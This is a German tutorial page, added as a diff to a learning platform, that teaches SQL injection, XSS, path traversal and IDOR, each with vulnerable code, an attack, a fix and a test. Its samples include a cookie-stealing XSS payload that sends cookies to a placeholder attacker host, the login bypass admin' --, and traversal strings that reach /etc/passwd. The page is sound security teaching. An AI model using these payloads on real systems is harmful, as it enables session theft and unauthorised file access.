@@ -1,0 +1,317 @@
+---
+title: Web-Schwachstellen verstehen und beheben
+description: Die OWASP Top 10 und die wichtigsten Schwachstellen an echtem Code – SQL-Injection, Cross-Site-Scripting, Path Traversal und fehlerhafte Zugriffskontrolle (IDOR) – jeweils mit Angriff, Behebung und Test, dazu CSRF, SSRF und Sicherheits-Header.
+tags: [security, owasp, sql-injection, xss, web]
+---
+
+import Quiz from '@site/src/components/Quiz';
+import Tabs from '@theme/Tabs';
+import TabItem from '@theme/TabItem';
+import fragen from './02-web-schwachstellen.fragen.yaml';
+
+# Web-Schwachstellen verstehen und beheben
+
+:::info[Lernziele]
+Nach dieser Lektion kannst du …
+- die **OWASP Top 10** einordnen,
+- **SQL-Injection, XSS, Path Traversal und IDOR** erkennen, ausnutzen (im eigenen Code) und beheben,
+- für jede dieser Schwachstellen einen **Sicherheitstest** schreiben,
+- **CSRF, SSRF** und **Sicherheits-Header** erklären.
+:::
+
+Alle Beispiele stammen aus [beispiele/security](https://github.com/Smie89/lernplattform/tree/main/beispiele/security):
+`unsicher.py` enthält die Schwachstellen, `sicher.py` dieselben Funktionen behoben, `test_angriffe.py` führt jeden Angriff
+gegen beide aus.
+
+```bash
+cd beispiele/security
+python -m unittest -v      # 34 Tests, alle grün
+```
+
+## Die OWASP Top 10 \{#owasp-top-10}
+
+Das **Open Worldwide Application Security Project (OWASP)** veröffentlicht regelmäßig die zehn wichtigsten Risiken für
+Webanwendungen, ermittelt aus Daten tausender Anwendungen. Die Ausgabe **2025**:
+
+| Nr. | Risiko | in dieser Lektion |
+|---|---|---|
+| A01 | **Broken Access Control** – fehlerhafte Zugriffskontrolle | [IDOR](#idor), [Path Traversal](#path-traversal) |
+| A02 | Security Misconfiguration – Fehlkonfiguration | [Header](#header), [Härtung](./05-systemhaertung.mdx) |
+| A03 | Software Supply Chain Failures – Lieferkette (Abhängigkeiten, Build) | [SCA](./04-sicherheitstests-devsecops.mdx#sca) |
+| A04 | Cryptographic Failures – Fehler bei Kryptografie | [Passwörter](./03-authentifizierung-kryptografie.mdx#passwoerter) |
+| A05 | **Injection** – u. a. SQL-Injection und XSS | [SQL-Injection](#sql-injection), [XSS](#xss) |
+| A06 | Insecure Design – unsicherer Entwurf | [Bedrohungsmodellierung](./04-sicherheitstests-devsecops.mdx#threat-modeling) |
+| A07 | Authentication Failures – Fehler bei der Anmeldung | [Authentifizierung](./03-authentifizierung-kryptografie.mdx) |
+| A08 | Software or Data Integrity Failures – fehlende Integritätsprüfung | Signaturen, geprüfte Updates |
+| A09 | Logging and Alerting Failures – fehlende Protokollierung und Alarmierung | [Erkennung](./06-erkennung-incident-response.mdx) |
+| A10 | Mishandling of Exceptional Conditions – Fehlerbehandlung | [Fail Secure](./01-security-grundlagen.mdx#prinzipien) |
+
+:::tip[Aktuellen Stand prüfen]
+Die Liste wird alle paar Jahre überarbeitet; Reihenfolge und Namen ändern sich. Maßgeblich ist owasp.org. Für Tests ist
+der **OWASP Web Security Testing Guide (WSTG)** die passende Ergänzung: Er beschreibt zu jedem Thema konkrete Prüfschritte.
+:::
+
+## SQL-Injection \{#sql-injection}
+
+**Ursache:** Eingaben werden **in den Text** eines SQL-Befehls eingebaut. Dann kann eine Eingabe die Bedeutung des Befehls
+ändern.
+
+```python title="unsicher.py"
+def anmelden(db, name, passwort):
+    # Schwachstelle: SQL-Injection – Eingaben werden in den SQL-Text eingebaut.
+    sql = (
+        f"SELECT name FROM benutzer "
+        f"WHERE name = '{name}' AND passwort_hash = '{passwort_hashen(passwort)}'"
+    )
+    zeile = db.execute(sql).fetchone()
+    return zeile[0] if zeile else None
+```
+
+**Angriff:** Als Benutzername `admin' --` eingeben, als Passwort irgendetwas. Daraus wird:
+
+```sql
+SELECT name FROM benutzer WHERE name = 'admin' --' AND passwort_hash = '...'
+```
+
+Das `'` beendet den String, `--` macht den Rest zum **Kommentar** – die Passwortprüfung ist verschwunden, der Angreifer
+ist als `admin` angemeldet. Mit anderen Eingaben lassen sich ganze Tabellen auslesen (`UNION SELECT`) oder Daten ändern.
+
+**Behebung:** **Parametrisierte Abfragen** (Prepared Statements). Der SQL-Text ist fest, die Eingabe wird getrennt als
+**Wert** übergeben und kann den Befehl nie verändern.
+
+<Tabs groupId="sprache">
+<TabItem value="python" label="Python">
+
+```python title="sicher.py"
+zeile = db.execute(
+    "SELECT name, passwort_hash FROM benutzer WHERE name = ?", (name,)
+).fetchone()
+```
+
+</TabItem>
+<TabItem value="csharp" label="C#">
+
+```csharp
+using var befehl = new SqlCommand(
+    "SELECT name, passwort_hash FROM benutzer WHERE name = @name", verbindung);
+befehl.Parameters.Add("@name", SqlDbType.NVarChar, 50).Value = name;
+// Entity Framework Core ist ebenfalls sicher – außer bei FromSqlRaw mit verketteten Strings.
+```
+
+</TabItem>
+<TabItem value="java" label="Java">
+
+```java
+try (PreparedStatement befehl = verbindung.prepareStatement(
+        "SELECT name, passwort_hash FROM benutzer WHERE name = ?")) {
+    befehl.setString(1, name);
+    ResultSet ergebnis = befehl.executeQuery();
+}
+// JPA/Hibernate: Parameter mit :name binden, nie per "+" in JPQL einbauen.
+```
+
+</TabItem>
+</Tabs>
+
+**Test:** Der Angriff muss scheitern – und die normale Anmeldung weiter funktionieren:
+
+```python title="test_angriffe.py"
+SQL_INJECTION = "admin' --"
+
+def test_sql_injection_scheitert(self):
+    self.assertIsNone(sicher.anmelden(self.db, SQL_INJECTION, "egal"))
+```
+
+:::warning[Escaping und Eingabefilter reichen nicht]
+„Gefährliche Zeichen“ herausfiltern ist fehleranfällig – es gibt zu viele Varianten und Datenbankdialekte. Die richtige
+Lösung ist immer: **Daten und Befehl trennen**. Eingabevalidierung (z. B. „Kundennummer besteht nur aus Ziffern“) ist eine
+sinnvolle **zusätzliche** Schicht.
+:::
+
+Dasselbe Prinzip gilt für alle **Injection**-Arten: Betriebssystembefehle (`subprocess` mit Liste statt `shell=True`),
+LDAP, XPath, Template-Engines – und auch **Prompt-Injection** bei LLMs, wo Daten und Anweisungen leider nicht sauber
+trennbar sind (siehe [KI-Systeme testen](../06-ki/06-ki-systeme-testen.mdx#prompt-injection)).
+
+## Cross-Site-Scripting (XSS) \{#xss}
+
+**Ursache:** Eingaben landen **ungeprüft im HTML** einer Seite. Enthalten sie Skriptcode, führt der Browser des **Opfers**
+ihn aus – mit allen Rechten der angemeldeten Person.
+
+```python title="unsicher.py"
+def kommentar_html(autor, text):
+    return f"<p><b>{autor}</b>: {text}</p>"
+```
+
+**Angriff:** Ein Kommentar mit dem Inhalt
+
+```html
+<script>fetch('https://angreifer.example/?c='+document.cookie)</script>
+```
+
+wird bei **jedem Besucher** ausgeführt und schickt dessen Cookies an den Angreifer. Damit kann er die Sitzung übernehmen,
+im Namen des Opfers handeln oder die Seite verändern.
+
+| Art | Wo steckt der Schadcode? |
+|---|---|
+| **Gespeichertes XSS** (stored) | in der Datenbank, z. B. Kommentar, Profilname – trifft alle Besucher |
+| **Reflektiertes XSS** (reflected) | in der URL, z. B. Suchbegriff wird auf der Ergebnisseite angezeigt – Opfer muss einen präparierten Link öffnen |
+| **DOM-basiertes XSS** | entsteht im Browser durch JavaScript, z. B. `element.innerHTML = location.hash` |
+
+**Behebung:** Ausgaben **kontextgerecht kodieren**. Im HTML werden `<`, `>`, `&`, `"` und `'` zu HTML-Entities, der Browser
+zeigt sie dann als Text an:
+
+```python title="sicher.py"
+import html
+
+def kommentar_html(autor, text):
+    return f"<p><b>{html.escape(autor)}</b>: {html.escape(text)}</p>"
+```
+
+Moderne Frameworks kodieren **automatisch**: Razor (`@kommentar`), Thymeleaf (`th:text`), React (`{kommentar}`), Angular.
+Gefährlich wird es dort, wo man die Kodierung **abschaltet**: `@Html.Raw(...)`, `th:utext`, `dangerouslySetInnerHTML`,
+`innerHTML`. Genau nach diesen Stellen sucht man beim Code-Review.
+
+Zusätzliche Schichten: **Content Security Policy** (CSP, siehe [Header](#header)) verbietet eingeschleuste Skripte, und
+Session-Cookies mit **HttpOnly** sind für JavaScript gar nicht lesbar.
+
+**Test:**
+
+```python title="test_angriffe.py"
+def test_xss_wird_kodiert(self):
+    ausgabe = sicher.kommentar_html("mallory", XSS)
+    self.assertNotIn("<script>", ausgabe)
+    self.assertIn("&lt;script&gt;", ausgabe)
+```
+
+Im UI-Test (z. B. mit [Playwright](../02-testautomation/04-browser/01-playwright-grundlagen.mdx)) prüft man zusätzlich:
+Kommentar mit `<img src=x onerror="window.xss=1">` speichern, Seite neu laden, dann muss `window.xss` undefiniert sein.
+
+## Path Traversal \{#path-traversal}
+
+**Ursache:** Ein Dateiname aus der Eingabe wird an einen Pfad angehängt, ohne zu prüfen, wohin er wirklich führt.
+
+```python title="unsicher.py"
+def datei_lesen(basis, dateiname):
+    return (Path(basis) / dateiname).read_text(encoding="utf-8")
+```
+
+**Angriff:** `../geheim.txt` oder `../../etc/passwd` – jedes `../` führt eine Ebene nach oben, aus dem erlaubten Ordner
+heraus. Ein absoluter Pfad wie `/etc/passwd` ersetzt die Basis sogar ganz. So gelangen Angreifer an Konfigurationsdateien
+mit Passwörtern oder an Quellcode.
+
+**Behebung:** Den **endgültigen Pfad auflösen** und prüfen, ob er noch im erlaubten Ordner liegt:
+
+```python title="sicher.py"
+def datei_lesen(basis, dateiname):
+    basis = Path(basis).resolve()
+    ziel = (basis / dateiname).resolve()  # löst "../" und symbolische Links auf
+    if not ziel.is_relative_to(basis):
+        raise PermissionError(f"Zugriff außerhalb von {basis} verweigert: {dateiname}")
+    return ziel.read_text(encoding="utf-8")
+```
+
+Noch besser ist, gar keine Dateinamen von außen anzunehmen, sondern **IDs**, die auf eine feste Liste erlaubter Dateien
+zeigen.
+
+**Test** – mehrere Varianten in einem Test, mit `subTest` jeweils einzeln gemeldet:
+
+```python title="test_angriffe.py"
+def test_path_traversal_wird_verweigert(self):
+    for angriff in (PATH_TRAVERSAL, "../../etc/passwd", str(Path(self.ordner.name) / "geheim.txt")):
+        with self.subTest(angriff=angriff), self.assertRaises(PermissionError):
+            sicher.datei_lesen(self.basis, angriff)
+```
+
+## Fehlerhafte Zugriffskontrolle (IDOR) \{#idor}
+
+**Broken Access Control** ist seit Jahren **Platz 1** der OWASP Top 10. Die häufigste Form ist **IDOR** (Insecure Direct
+Object Reference): Die Anwendung prüft, **ob** jemand angemeldet ist, aber nicht, **ob ihm das Objekt gehört**.
+
+```python title="unsicher.py"
+def bestellung_holen(db, angemeldet, bestell_id):
+    return db.execute(
+        "SELECT id, besitzer, artikel FROM bestellungen WHERE id = ?", (bestell_id,)
+    ).fetchone()
+```
+
+Bemerkenswert: Diese Abfrage ist **parametrisiert**, also sicher gegen SQL-Injection – und trotzdem unsicher.
+
+**Angriff:** Ben ist angemeldet und ruft `/bestellungen/2` auf (seine eigene). Dann ändert er die Zahl in der URL auf `1` –
+und sieht Annas Bestellung. Ein Skript, das alle IDs durchzählt, liest **alle** Bestellungen aus.
+
+**Behebung:** Die **Autorisierung** gehört in jede Abfrage bzw. jeden Endpunkt – serverseitig, nie nur im Frontend:
+
+```python title="sicher.py"
+def bestellung_holen(db, angemeldet, bestell_id):
+    return db.execute(
+        "SELECT id, besitzer, artikel FROM bestellungen WHERE id = ? AND besitzer = ?",
+        (bestell_id, angemeldet),
+    ).fetchone()
+```
+
+Fremde und nicht vorhandene Bestellungen liefern **dasselbe Ergebnis** (`None` bzw. HTTP 404). So verrät die Anwendung
+nicht einmal, welche IDs existieren.
+
+**Test:**
+
+```python title="test_angriffe.py"
+def test_fremde_bestellung_nicht_lesbar(self):
+    self.assertIsNone(sicher.bestellung_holen(self.db, "ben", 1))
+
+def test_fremde_und_fehlende_bestellung_sehen_gleich_aus(self):
+    self.assertEqual(sicher.bestellung_holen(self.db, "ben", 1), sicher.bestellung_holen(self.db, "ben", 999))
+```
+
+:::tip[Der wichtigste Sicherheitstest für Tester]
+Zugriffskontrolle findet **kein automatisches Werkzeug** zuverlässig, weil es dafür wissen müsste, wem was gehört. Mit
+zwei Testbenutzern und einer Tabelle „Rolle × Endpunkt × erwartetes Ergebnis“ findet man solche Lücken aber systematisch.
+Mit [REST Assured](../02-testautomation/03-java/02-rest-assured.mdx) oder einem API-Test in C# wird daraus ein
+datengetriebener Test: Für jeden Endpunkt einmal als Besitzer (200), als anderer Benutzer (404 oder 403) und ohne
+Anmeldung (401).
+:::
+
+## Weitere wichtige Schwachstellen \{#weitere}
+
+| Schwachstelle | Angriff | Gegenmaßnahme |
+|---|---|---|
+| **CSRF** (Cross-Site Request Forgery) | Eine fremde Seite löst im Browser des angemeldeten Opfers eine Aktion aus, z. B. ein verstecktes Formular „Passwort ändern“ | Cookies mit `SameSite=Lax` oder `Strict`, Anti-CSRF-Token in Formularen (in ASP.NET Core und Spring Security eingebaut) |
+| **SSRF** (Server-Side Request Forgery) | Der Server ruft eine vom Angreifer angegebene URL ab, z. B. interne Dienste oder Cloud-Metadaten unter `169.254.169.254` | Erlaubte Ziele als feste Liste, interne Adressen blockieren |
+| **Unsichere Deserialisierung** | Präparierte Objekte führen beim Einlesen Code aus | Keine nativen Objektformate (z. B. `pickle`, `BinaryFormatter`) aus fremden Quellen; JSON mit festem Schema |
+| **Mass Assignment** | Zusätzliches Feld im Request, z. B. `"istAdmin": true`, wird ungeprüft übernommen | Eigene Request-Klassen (DTOs) mit nur erlaubten Feldern |
+| **Ausführliche Fehlermeldungen** | Stacktrace verrät Framework, Versionen, SQL-Abfragen | Generische Fehlerseite, Details nur ins Log |
+
+## Sicherheits-Header \{#header}
+
+Mit wenigen HTTP-Headern schaltet man Schutzfunktionen des Browsers ein:
+
+| Header | Wirkung |
+|---|---|
+| `Content-Security-Policy` | Legt fest, woher Skripte, Styles und Bilder geladen werden dürfen – eingeschleuste Skripte werden blockiert |
+| `Strict-Transport-Security` | Browser nutzt für die Domain nur noch HTTPS (HSTS) |
+| `X-Content-Type-Options: nosniff` | Browser rät keinen Dateityp – eine hochgeladene „Bild“-Datei wird nicht als Skript ausgeführt |
+| `X-Frame-Options` bzw. CSP `frame-ancestors` | Seite darf nicht in fremde Frames eingebettet werden (Schutz vor Clickjacking) |
+| `Set-Cookie: …; Secure; HttpOnly; SameSite=Lax` | Cookie nur über HTTPS, nicht für JavaScript lesbar, nicht bei fremden Seiten mitgeschickt |
+
+Prüfen lässt sich das in jedem API-Test oder mit `curl -I https://…`; der DAST-Scanner
+[ZAP](./04-sicherheitstests-devsecops.mdx#dast) meldet fehlende Header automatisch.
+
+## Typische Fehler \{#typische-fehler}
+
+- **Strings zu SQL verketten** – auch „nur intern“ oder „nur für Admins“.
+- **Kodierung abschalten** (`Html.Raw`, `innerHTML`), weil HTML-Formatierung gewünscht ist – stattdessen eine geprüfte
+  Bibliothek zum Bereinigen von HTML verwenden.
+- **Zugriffskontrolle nur im Frontend**: Ausgeblendete Buttons schützen nichts, die API ist trotzdem aufrufbar.
+- **Nur prüfen, ob jemand angemeldet ist**, nicht, ob er das Objekt sehen darf.
+- **Eigene Blocklisten** für gefährliche Zeichen statt Trennung von Daten und Befehl.
+- **Nur den positiven Fall testen** – Sicherheitstests sind fast immer Negativtests.
+
+## Zusammenfassung \{#zusammenfassung}
+
+- Die **OWASP Top 10** zeigen die wichtigsten Risiken; Platz 1 ist **fehlerhafte Zugriffskontrolle**.
+- **SQL-Injection**: Daten und Befehl trennen – parametrisierte Abfragen.
+- **XSS**: Ausgaben kontextgerecht kodieren, Framework-Kodierung nicht abschalten, CSP und HttpOnly als weitere Schichten.
+- **Path Traversal**: Pfad auflösen und gegen den erlaubten Ordner prüfen – oder IDs statt Dateinamen.
+- **IDOR**: Bei jedem Zugriff serverseitig prüfen, ob das Objekt dem Benutzer gehört; fremd und fehlend sehen gleich aus.
+- Für jede Lücke gibt es einen **Sicherheitstest**: Angriff muss scheitern, normale Funktion muss bleiben.
+
+<Quiz fragen={fragen} titel="Quiz: Web-Schwachstellen" />
